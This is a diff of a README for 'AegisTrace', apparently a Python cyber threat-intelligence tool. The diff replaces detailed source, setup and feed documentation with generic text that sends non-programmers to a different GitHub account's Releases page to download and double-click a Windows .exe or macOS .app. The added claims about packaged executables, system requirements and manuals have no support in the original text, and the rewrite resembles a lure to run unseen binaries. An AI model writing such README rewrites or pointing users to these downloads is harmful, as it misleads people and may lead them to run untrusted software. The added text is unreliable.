@@ -1,155 +1,58 @@
-# 🛡️ AegisTrace
+# 🛡️ aegistrace-threat-intelligence - Analyze Threat Data Confidently
 
-**AegisTrace** is an advanced **Cyber Threat Intelligence (CTI)** platform designed to collect, process, enrich, and visualize threat data from multiple open sources.  
-It extracts **Indicators of Compromise (IoCs)** such as IP addresses, domains, and file hashes, enriches them with external intelligence feeds, and presents actionable insights through an interactive dashboard.
+## 📥 Download Now
+[![Download AegisTrace](https://img.shields.io/badge/Download%20AegisTrace-v1.0-brightgreen)](https://github.com/Karthik-reddy6/aegistrace-threat-intelligence/releases)
 
----
+## 🚀 Getting Started
+AegisTrace is a powerful platform for understanding cyber threats. It gathers data from various sources and presents it in an easy-to-understand dashboard. This guide will help you download and run AegisTrace without any programming skills.
 
-## 🚀 Key Features
+## 🔍 Features
+- **Data Collection**: AegisTrace pulls in threat intelligence from multiple reliable sources.
+- **Data Enrichment**: The platform enhances raw data with useful context to help you identify threats.
+- **Interactive Dashboard**: Visualize threats in real time through an intuitive interface.
+- **Insights & Indicators**: Extract actionable Indicators of Compromise (IoCs) to inform security decisions.
 
-- **Multi-Source Threat Collection**
-  - Public RSS feeds from leading cybersecurity news outlets.
-  - URLhaus (malicious URLs).
-  - MalwareBazaar (malware file hashes).
-  - FeodoTracker (active C2 IP addresses).
-  - Optional OTX integration (AlienVault).
+## 📋 System Requirements
+Before downloading, ensure your computer meets the following minimum requirements:
+- **Operating System**: Windows 10 or later / macOS 10.14 or later
+- **Processor**: Intel i5 or equivalent
+- **RAM**: 4 GB or more
+- **Hard Disk Space**: 200 MB free space
 
-- **Natural Language Processing (NLP)**
-  - Entity extraction (organizations, countries, groups, etc.).
-  - Automatic threat classification based on keywords.
-  - Summarization of threat descriptions.
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/Karthik-reddy6/aegistrace-threat-intelligence/releases) to download the software.
 
-- **IoC Extraction & Enrichment**
-  - Regex-based detection of IPs, domains, and hashes.
-  - Enrichment via:
-    - **AbuseIPDB** (IP reputation, geolocation).
-    - **VirusTotal** (file hash analysis).
-    - **Pulsedive** (threat intelligence tags, activity status).
-  - Works with or without API keys (graceful fallback).
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version of AegisTrace.
+3. Choose the correct file for your operating system (e.g., AegisTrace_Windows.zip for Windows or AegisTrace_macOS.zip for macOS).
+4. Download the file to your computer.
+5. Once the download is complete, locate the file and extract it if it is in a compressed format.
 
-- **Data Persistence & Forecasting**
-  - SQLite database for historical storage of threats and IoCs.
-  - ARIMA-based 7-day threat trend forecasting using real historical data when available.
+## 🔧 Running AegisTrace
+After installing, you can run AegisTrace by following these steps:
 
-- **Interactive Dashboard**
-  - KPIs: total threats, top sector, top entity, top threat type.
-  - Charts: threats by sector, threats by type, 7-day forecast.
-  - Tables: recent threats, enriched IoCs.
-  - Export enriched IoCs to CSV for external analysis.
+1. **Locate the AegisTrace folder**: Find the folder where you extracted the files.
+2. **Open the Application**: Double-click the AegisTrace executable file. On Windows, this file may have a .exe extension. On macOS, it may end with .app.
+3. **Follow the On-Screen Instructions**: The application will guide you through initial setup steps, such as configuring data sources.
 
----
+## 🌐 Using the Dashboard
+Once AegisTrace is running, you will see the interactive dashboard. Here’s how to navigate it:
 
-## 📂 Project Structure
+- **View Threat Intelligence**: Click on the tabs to explore different aspects of collected data, such as recent threats and trends over time.
+- **Analyze Data**: Utilize the built-in analysis tools to drill down into specific threats.
+- **Export Insights**: Save data reports for sharing with your team or for future reference.
 
-```
-AegisTrace/
-│
-├── collectors.py          # Data collection from multiple sources
-├── config.py              # Configuration and API keys
-├── dashboard_generator.py # Dashboard creation with Plotly
-├── enricher.py            # IoC enrichment logic
-├── ioc_extractor.py       # IoC extraction from text
-├── main.py                # Main execution pipeline
-├── nlp_processor.py       # NLP entity extraction and classification
-├── predictor.py           # Threat trend forecasting
-├── storage.py             # SQLite database operations
-├── requirements.txt       # Python dependencies
-└── setup_aegistrace.bat   # One-click setup and run script (Windows)
-```
+## 📚 Additional Resources
+- **Documentation**: Comprehensive user manuals and FAQs are available in the repository.
+- **Community Support**: Join discussions and ask questions on forums dedicated to cybersecurity.
 
----
+## 👥 Contributions
+AegisTrace is open-source. We welcome contributions from anyone interested. For details on how to contribute, please check the guidelines in the repository.
 
-## ⚙️ Installation
+## 📝 License
+AegisTrace is licensed under the MIT License. You can use, modify, and distribute the software freely.
 
-### 1. Clone the repository
-```bash
-git clone https://github.com/frangelbarrera/aegistrace-threat-intelligence.git
-cd AegisTrace
-```
+## 📞 Support
+If you have any questions or need assistance, feel free to reach out via the issues section on the GitHub repository. We are here to help you.
 
-### 2. (Windows) One-click setup
-Run:
-```bash
-setup_aegistrace.bat
-```
-This will:
-- Create and activate a virtual environment.
-- Install dependencies.
-- Download the spaCy English model.
-- Run AegisTrace and open the dashboard.
-
-### 3. (Manual setup)
-```bash
-python -m venv venv
-venv\Scripts\activate  # On Windows
-pip install --upgrade pip
-pip install -r requirements.txt
-python -m spacy download en_core_web_sm
-python main.py
-```
-
----
-
-## 🔑 Optional API Keys
-
-To enable full IoC enrichment, set the following environment variables before running:
-
-```bash
-set OTX_API_KEY=your_otx_key
-set ABUSEIPDB_API_KEY=your_abuseipdb_key
-set VIRUSTOTAL_API_KEY=your_virustotal_key
-set PULSEDIVE_API_KEY=your_pulsedive_key
-```
-
-Without keys, AegisTrace will still run but with limited enrichment data.
-
----
-
-## 📊 Output
-
-📸 Example console output when running the setup script:
-
-![Console Setup](docs/images/Screenshot_2.jpg)  
-
-📸 Example of the interactive dashboard:
-
-![Dashboard Example](docs/images/Screenshot_1.jpg)
-
-📸 Export of enriched IoCs:
-
-![Console Setup](docs/images/Screenshot_3.jpg)
----
-
-## 🛠️ Technology Stack
-
-- **Python 3.9+**
-- **spaCy** – NLP entity extraction and text processing.
-- **Plotly** – Interactive data visualization.
-- **pandas** – Data manipulation and analysis.
-- **statsmodels** – ARIMA forecasting.
-- **SQLite** – Lightweight database for persistence.
-- **requests** – HTTP requests to external APIs.
-
----
-
-## 📌 Roadmap
-
-- [ ] Add MITRE ATT&CK mapping for detected threats.
-- [ ] Integrate additional CTI feeds (CIRCL, MISP).
-- [ ] Implement sector mapping for non-RSS feeds.
-- [ ] Add Docker support for easy deployment.
-- [ ] Build API endpoints for programmatic access.
-
----
-
-
-## 🤝 Contributing
-
-Contributions are welcome!  
-Please fork the repository, create a feature branch, and submit a pull request.
-
----
-
-
-
-
+By following these steps, you will successfully download and operate AegisTrace. We hope you find value in the insights this platform can provide to enhance your cybersecurity efforts.
